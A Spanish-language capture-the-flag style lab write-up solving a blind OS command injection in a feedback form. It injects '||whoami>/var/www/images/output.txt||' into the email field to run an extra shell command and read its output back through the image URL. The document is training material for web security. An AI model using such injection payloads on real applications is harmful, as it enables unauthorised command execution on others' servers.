# 03 Lab: Blind OS command injection with output redirection

## Objetivo

> 
> 
> 
> This lab contains a blind OS command injection vulnerability in the feedback function.
> 
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
> 
> ```
> /var/www/images/
> ```
> 
> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
> 
> To solve the lab, execute the `whoami` command and retrieve the output.
> 

## Solución

> Suponemos que la funcionalidad de feedback se realiza usando el siguiente script:
> 

```bash
mail -s "This site is great" -a From:peter@normal-user.net feedback@vulnerable-website.com
```

1. Evaluamos la sección de Feedback a travez del repeater, los campos  `email`
    
    ![image.png](03%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redi%2017efab5460ec81c6b31bef9a4faef6ae/image.png)
    
2. Añadimos `||whoami>/var/www/images/output.txt||` en el campo `email` , con el espacio an inicio, para añadir una instrucción extra.
    
    Quedando de la siguiente manera la ejecución, ocasionando la escritura de un archivo, recordemos que debemos elegir una dirección u archivo correcto, ademas que sabemos, el directorio tiene permiso de escritura:
    
    ```bash
    mail -s "This site is great" -a From:peter@normal-user.net feedback@vulnerable-website.com **||whoami>/var/www/images/output.txt||** 
    ```
    
    ![image.png](03%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redi%2017efab5460ec81c6b31bef9a4faef6ae/image%201.png)
    
    ![image.png](03%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redi%2017efab5460ec81c6b31bef9a4faef6ae/image%202.png)
    
    ![image.png](03%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redi%2017efab5460ec81c6b31bef9a4faef6ae/image%203.png)